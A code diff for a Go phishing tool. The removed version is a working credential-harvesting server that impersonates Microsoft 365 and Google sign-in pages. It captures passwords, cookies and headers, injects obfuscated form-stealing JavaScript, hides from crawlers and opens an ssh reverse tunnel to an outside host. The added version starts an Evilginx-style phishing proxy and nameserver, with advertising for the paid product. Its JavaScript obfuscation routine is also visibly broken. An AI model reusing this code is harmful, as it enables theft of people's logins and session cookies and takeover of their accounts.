@@ -1,357 +1,221 @@
 package main
 
 import (
-	"bytes"
-	"crypto/tls"
-	"encoding/json"
 	"flag"
 	"fmt"
-	"io"
-	"log"
-	"net/http"
-	"net/http/httputil"
-	"net/url"
-	"os/exec"
+	"os"
+	"os/user"
+	"path/filepath"
 	"regexp"
-	"strings"
-	"sync"
-	"text/template"
-	"time"
 
-	"github.com/gorilla/sessions"
-	"golang.org/x/crypto/acme/autocert"
+	"phishing-tool/core"
+	"phishing-tool/database"
+	"phishing-tool/log"
+
+	"github.com/caddyserver/certmagic"
+	"github.com/fatih/color"
+	"go.uber.org/zap"
 )
-
-type CapturedData struct {
-    Type      string            `json:"type"`
-    Username  string            `json:"username,omitempty"`
-    Password  string            `json:"password,omitempty"`
-    Cookies   map[string]string `json:"cookies,omitempty"`
-    Headers   http.Header       `json:"headers,omitempty"`
-    URL       string            `json:"url"`
-    Method    string            `json:"method"`
-    Body      string            `json:"body,omitempty"`
-    Timestamp time.Time         `json:"timestamp"`
-    IP        string            `json:"ip"`
-    UserAgent string            `json:"user_agent"`
-    SessionID string            `json:"session_id,omitempty"`
-}
-
-type Phishlet struct {
-    Name        string
-    TargetURL   string
-    Title       string
-    LogoURL     string
-    FormFields  []string
-    JSInject    string
-    CookieNames []string
-}
-
-type Config struct {
-    BindAddr      string
-    BackendURL    string
-    PhishletName  string
-    EnableSSL     bool
-    DNSProvider   string
-    Domain        string
-    OracleHost    string
-    SessionSecret string
-    Obfuscate     bool
-}
 
 var (
-    config       Config
-    captured     []CapturedData
-    mu           sync.Mutex
-    store        *sessions.CookieStore
-    phishlets    map[string]Phishlet
-    reverseProxy *httputil.ReverseProxy
-    botDetectors = []string{"bot", "crawler", "spider", "headless", "phantom"}
+	phishletsDir   = flag.String("p", "", "Phishlets directory path")
+	redirectorsDir = flag.String("t", "", "HTML redirector pages directory path")
+	debugLog       = flag.Bool("debug", false, "Enable debug output")
+	developerMode  = flag.Bool("developer", false, "Enable developer mode (generates self-signed certificates for all hostnames)")
+	cfgDir         = flag.String("c", "", "Configuration directory path")
+	versionFlag    = flag.Bool("v", false, "Show version")
 )
 
-const defaultPhishletHTML = `
-<!DOCTYPE html>
-<html>
-<head>
-    <title>{{.Title}}</title>
-    <script>{{.JSInject}}</script>
-    <style>/* Modern phishing CSS */</style>
-</head>
-<body>
-    <div class="login-container">
-        <img src="{{.LogoURL}}" alt="Logo">
-        <h1>{{.Title}}</h1>
-        <form id="phishForm" method="POST">
-            {{range $field := .FormFields}}
-            <input type="{{$field}}" name="{{$field}}" placeholder="{{$field | title}}" required>
-            {{end}}
-            <button type="submit">Login</button>
-        </form>
-    </div>
-</body>
-</html>`
+func joinPath(basePath, relPath string) string {
+	if filepath.IsAbs(relPath) {
+		return relPath
+	}
+	return filepath.Join(basePath, relPath)
+}
 
-func init() {
-    phishlets = map[string]Phishlet{
-        "office365": {
-            Name:        "office365",
-            TargetURL:   "https://login.microsoftonline.com",
-            Title:       "Microsoft - Sign In",
-            LogoURL:     "//login.microsoftonline.com/favicon.ico",
-            FormFields:  []string{"username", "password"},
-            JSInject:    obfuscateJS(`document.addEventListener('DOMContentLoaded', function() { console.log('Phishlet loaded'); });`),
-            CookieNames: []string{"MSISAAccountType"},
-        },
-        "gmail": {
-            Name:        "gmail",
-            TargetURL:   "https://accounts.google.com",
-            Title:       "Google - Sign In",
-            LogoURL:     "//accounts.google.com/favicon.ico",
-            FormFields:  []string{"email", "password"},
-            JSInject:    obfuscateJS(`setTimeout(() => { window.scrollTo(0,0); }, 100);`),
-            CookieNames: []string{"NID", "SID"},
-        },
-    }
+func showEvilginxProAd() {
+	lred := color.New(color.FgHiRed)
+	lyellow := color.New(color.FgHiYellow)
+	white := color.New(color.FgHiWhite)
+	message := fmt.Sprintf("%s %s: %s %s",
+		lred.Sprint("Evilginx Pro"),
+		white.Sprint("is finally out"),
+		lyellow.Sprint("https://evilginx.com"),
+		white.Sprint("(advanced phishing framework for red teams)"),
+	)
+	log.Info("%s", message)
+}
+
+func showEvilginxMasteryAd() {
+	lyellow := color.New(color.FgHiYellow)
+	white := color.New(color.FgHiWhite)
+	hcyan := color.New(color.FgHiCyan)
+	message := fmt.Sprintf("%s: %s %s",
+		hcyan.Sprint("Evilginx Mastery Course"),
+		lyellow.Sprint("https://academy.breakdev.org/evilginx-mastery"),
+		white.Sprint("(learn how to create phishlets)"),
+	)
+	log.Info("%s", message)
 }
 
 func main() {
-    parseFlags()
-    loadConfig()
-    setupSessionStore()
-    setupReverseProxy()
+	flag.Parse()
 
-    log.Printf("Phishing server starting on %s (Phishlet: %s)", config.BindAddr, config.PhishletName)
+	if *versionFlag {
+		log.Info("version: %s", core.VERSION)
+		return
+	}
 
-    if config.EnableSSL && config.Domain != "" {
-        startHTTPS()
-    } else {
-        startHTTP()
-    }
-}
+	exePath, err := os.Executable()
+	if err != nil {
+		log.Fatal("failed to get executable path: %v", err)
+	}
+	exeDir := filepath.Dir(exePath)
 
-func parseFlags() {
-    flag.StringVar(&config.BindAddr, "bind", "0.0.0.0:8080", "Bind address")
-    flag.StringVar(&config.BackendURL, "backend", "", "Backend target URL for reverse proxy")
-    flag.StringVar(&config.PhishletName, "phishlet", "office365", "Phishlet name")
-    flag.BoolVar(&config.EnableSSL, "ssl", true, "Enable SSL")
-    flag.StringVar(&config.Domain, "domain", "", "Domain for SSL certs")
-    flag.StringVar(&config.OracleHost, "oracle", "", "Oracle host for tunnel")
-    flag.StringVar(&config.SessionSecret, "secret", "phish-secret-key-change-me", "Session secret")
-    flag.BoolVar(&config.Obfuscate, "obfuscate", true, "Enable payload obfuscation")
-    flag.Parse()
-}
+	core.Banner()
+	showEvilginxProAd()
+	showEvilginxMasteryAd()
 
-func loadConfig() {
-    if config.BackendURL == "" {
-        config.BackendURL = phishlets[config.PhishletName].TargetURL
-    }
-}
+	// Suppress certmagic logs
+	certmagic.Default.Logger = zap.NewNop()
+	certmagic.DefaultACME.Logger = zap.NewNop()
 
-func setupSessionStore() {
-    store = sessions.NewCookieStore([]byte(config.SessionSecret))
-}
+	// Set default phishlets directory
+	if *phishletsDir == "" {
+		*phishletsDir = joinPath(exeDir, "./phishlets")
+		if _, err := os.Stat(*phishletsDir); os.IsNotExist(err) {
+			*phishletsDir = "/usr/share/evilginx/phishlets/"
+			if _, err := os.Stat(*phishletsDir); os.IsNotExist(err) {
+				log.Fatal("you need to provide the path to directory where your phishlets are stored: ./evilginx -p <phishlets_path>")
+			}
+		}
+	}
 
-func setupReverseProxy() {
-    target, _ := url.Parse(config.BackendURL)
-    reverseProxy = httputil.NewSingleHostReverseProxy(target)
+	// Set default redirectors directory
+	if *redirectorsDir == "" {
+		*redirectorsDir = joinPath(exeDir, "./redirectors")
+		if _, err := os.Stat(*redirectorsDir); os.IsNotExist(err) {
+			*redirectorsDir = "/usr/share/evilginx/redirectors/"
+			if _, err := os.Stat(*redirectorsDir); os.IsNotExist(err) {
+				*redirectorsDir = joinPath(exeDir, "./redirectors")
+			}
+		}
+	}
 
-    // URL Rewriter
-    originalDirector := reverseProxy.Director
-    reverseProxy.Director = func(req *http.Request) {
-        originalDirector(req)
-        req.Host = target.Host
-        req.Header.Set("X-Forwarded-Host", req.Header.Get("Host"))
-    }
+	// Validate directories
+	if _, err := os.Stat(*phishletsDir); os.IsNotExist(err) {
+		log.Fatal("provided phishlets directory path does not exist: %s", *phishletsDir)
+	}
+	if _, err := os.Stat(*redirectorsDir); os.IsNotExist(err) {
+		if err := os.MkdirAll(*redirectorsDir, 0700); err != nil {
+			log.Fatal("failed to create redirectors directory: %v", err)
+		}
+	}
 
-    // Modify Response for injection
-    originalModifyResponse := reverseProxy.ModifyResponse
-    reverseProxy.ModifyResponse = func(resp *http.Response) error {
-        if originalModifyResponse != nil {
-            originalModifyResponse(resp)
-        }
-        injectJS(resp)
-        return nil
-    }
-}
+	// Enable debug logging
+	log.DebugEnable(*debugLog)
+	if *debugLog {
+		log.Info("debug output enabled")
+	}
 
-func startHTTP() {
-    http.HandleFunc("/", handlePhishlet)
-    http.HandleFunc("/login", handleCapture)
-    http.HandleFunc("/api/captured", handleCapturedAPI)
-    http.HandleFunc("/proxy/", proxyHandler)
-    http.HandleFunc("/tunnel", handleOracleTunnel)
+	phishletsPath := *phishletsDir
+	log.Info("loading phishlets from: %s", phishletsPath)
 
-    log.Fatal(http.ListenAndServe(config.BindAddr, nil))
-}
+	// Set default config directory
+	if *cfgDir == "" {
+		usr, err := user.Current()
+		if err != nil {
+			log.Fatal("failed to get current user: %v", err)
+		}
+		*cfgDir = filepath.Join(usr.HomeDir, ".evilginx")
+	}
 
-func startHTTPS() {
-    m := autocert.Manager{
-        Cache:      autocert.DirCache("certs"),
-        Prompt:     autocert.AcceptTOS,
-        HostPolicy: autocert.HostWhitelist(config.Domain),
-    }
+	configPath := *cfgDir
+	log.Info("loading configuration from: %s", configPath)
 
-    srv := &http.Server{
-        Addr:      config.BindAddr,
-        TLSConfig: &tls.Config{GetCertificate: m.GetCertificate},
-    }
+	// Create config directory
+	if err := os.MkdirAll(*cfgDir, 0700); err != nil {
+		log.Fatal("failed to create config directory: %v", err)
+	}
 
-    log.Fatal(srv.ListenAndServeTLS("", ""))
-}
+	crtPath := joinPath(*cfgDir, "./crt")
 
-func handlePhishlet(w http.ResponseWriter, r *http.Request) {
-    phishlet := phishlets[config.PhishletName]
+	// Initialize core components
+	cfg, err := core.NewConfig(*cfgDir, "")
+	if err != nil {
+		log.Fatal("config: %v", err)
+	}
+	cfg.SetRedirectorsDir(*redirectorsDir)
 
-    tmpl := template.Must(template.New("phishlet").Parse(defaultPhishletHTML))
-    data := struct {
-        Title      string
-        LogoURL    string
-        FormFields []string
-        JSInject   string
-    }{
-        Title:      phishlet.Title,
-        LogoURL:    phishlet.LogoURL,
-        FormFields: phishlet.FormFields,
-        JSInject:   phishlet.JSInject,
-    }
+	db, err := database.NewDatabase(filepath.Join(*cfgDir, "data.db"))
+	if err != nil {
+		log.Fatal("database: %v", err)
+	}
 
-    w.Header().Set("Content-Security-Policy", "default-src 'unsafe-inline' 'unsafe-eval' * data: blob:; img-src * data: blob:;")
-    tmpl.Execute(w, data)
-}
+	bl, err := core.NewBlacklist(filepath.Join(*cfgDir, "blacklist.txt"))
+	if err != nil {
+		log.Error("blacklist: %s", err)
+		// Continue even if blacklist fails
+	}
 
-func handleCapture(w http.ResponseWriter, r *http.Request) {
-    if r.Method == "POST" {
-        captureCredentials(r)
-    }
+	// Load phishlets
+	files, err := os.ReadDir(phishletsPath)
+	if err != nil {
+		log.Fatal("failed to list phishlets directory '%s': %v", phishletsPath, err)
+	}
 
-    // Redirect to proxy
-    http.Redirect(w, r, "/proxy/"+r.URL.Path, http.StatusSeeOther)
-}
+	phishletRegex := regexp.MustCompile(`([a-zA-Z0-9\-\.]*)\.yaml`)
+	for _, f := range files {
+		if f.IsDir() {
+			continue
+		}
 
-func proxyHandler(w http.ResponseWriter, r *http.Request) {
-    if isBot(r) {
-        log.Printf("Bot detected: %s", r.RemoteAddr)
-        http.Error(w, "Access denied", http.StatusForbidden)
-        return
-    }
+		matches := phishletRegex.FindStringSubmatch(f.Name())
+		if len(matches) < 2 {
+			continue
+		}
 
-    reverseProxy.ServeHTTP(w, r)
-}
+		pname := matches[1]
+		if pname == "" {
+			continue
+		}
 
-func handleCapturedAPI(w http.ResponseWriter, r *http.Request) {
-    w.Header().Set("Content-Type", "application/json")
-    mu.Lock()
-    json.NewEncoder(w).Encode(captured)
-    mu.Unlock()
-}
+		pl, err := core.NewPhishlet(pname, filepath.Join(phishletsPath, f.Name()), nil, cfg)
+		if err != nil {
+			log.Error("failed to load phishlet '%s': %v", f.Name(), err)
+			continue
+		}
+		cfg.AddPhishlet(pname, pl)
+	}
 
-func handleOracleTunnel(w http.ResponseWriter, r *http.Request) {
-    if config.OracleHost == "" {
-        http.Error(w, "Oracle host not configured", http.StatusBadRequest)
-        return
-    }
+	cfg.LoadSubPhishlets()
+	cfg.CleanUp()
 
-    // Reverse tunnel to Oracle host
-    go func() {
-        cmd := exec.Command("ssh", "-R", "8080:localhost:8080", "-N", config.OracleHost)
-        cmd.Start()
-        log.Printf("Tunnel established to %s", config.OracleHost)
-    }()
+	// Start nameserver
+	ns, err := core.NewNameserver(cfg)
+	if err != nil {
+		log.Fatal("nameserver: %v", err)
+	}
+	ns.Start()
 
-    w.Write([]byte("Tunnel started"))
-}
+	// Initialize cert database
+	crtDb, err := core.NewCertDb(crtPath, cfg, ns)
+	if err != nil {
+		log.Fatal("certdb: %v", err)
+	}
 
-func captureCredentials(r *http.Request) {
-    session, _ := store.Get(r, "phish-session")
+	// Start HTTP proxy
+	hp, err := core.NewHttpProxy(cfg.GetServerBindIP(), cfg.GetHttpsPort(), cfg, crtDb, db, bl, *developerMode)
+	if err != nil {
+		log.Fatal("http proxy: %v", err)
+	}
+	hp.Start()
 
-    data := CapturedData{
-        Type:      "credential",
-        Username:  r.FormValue("username"),
-        Password:  r.FormValue("password"),
-        Cookies:   parseCookies(r),
-        Headers:   r.Header,
-        URL:       r.URL.String(),
-        Method:    r.Method,
-        Body:      readBody(r),
-        Timestamp: time.Now(),
-        IP:        r.RemoteAddr,
-        UserAgent: r.UserAgent(),
-        SessionID: session.ID,
-    }
+	// Start terminal
+	t, err := core.NewTerminal(hp, cfg, crtDb, db, *developerMode)
+	if err != nil {
+		log.Fatal("terminal: %v", err)
+	}
 
-    mu.Lock()
-    captured = append(captured, data)
-    mu.Unlock()
-
-    log.Printf("CAPTURED: %s:%s from %s", data.Username, data.Password, data.IP)
-}
-
-func parseCookies(r *http.Request) map[string]string {
-    cookies := make(map[string]string)
-    for _, c := range r.Cookies() {
-        cookies[c.Name] = c.Value
-    }
-    return cookies
-}
-
-func readBody(r *http.Request) string {
-    if r.Body == nil {
-        return ""
-    }
-    body, _ := io.ReadAll(r.Body)
-    return string(body)
-}
-
-func injectJS(resp *http.Response) {
-    if resp == nil || resp.Body == nil {
-        return
-    }
-
-    body, err := io.ReadAll(resp.Body)
-    if err != nil {
-        return
-    }
-
-    // Inject credential capture JS
-    js := obfuscateJS(`
-        document.addEventListener('submit', function(e) {
-            var formData = new FormData(e.target);
-            fetch('/login', {method: 'POST', body: formData});
-        });
-    `)
-
-    injected := regexp.MustCompile(`(?i)</body>`).ReplaceAll(body, []byte(js+"</body>"))
-
-    resp.Body = io.NopCloser(bytes.NewReader(injected))
-    resp.ContentLength = int64(len(injected))
-    resp.Header.Set("Content-Length", fmt.Sprintf("%d", len(injected)))
-}
-
-func obfuscateJS(js string) string {
-    if !config.Obfuscate {
-        return js
-    }
-    // Simple JS obfuscation
-    var sb strings.Builder
-    sb.WriteString("eval(")
-    for _, c := range js {
-        sb.WriteString(fmt.Sprintf("String.fromCharCode(%d)", c))
-    }
-    sb.WriteString(")")
-    return sb.String()
-}
-
-func isBot(r *http.Request) bool {
-    ua := strings.ToLower(r.UserAgent())
-    for _, detector := range botDetectors {
-        if strings.Contains(ua, detector) {
-            return true
-        }
-    }
-    return false
-}
-
-func urlRewriter(req *http.Request) {
-    // Rewrite URLs to proxy path
-    req.URL.Path = strings.ReplaceAll(req.URL.Path, config.BackendURL, "/proxy/")
+	t.DoWork()
 }
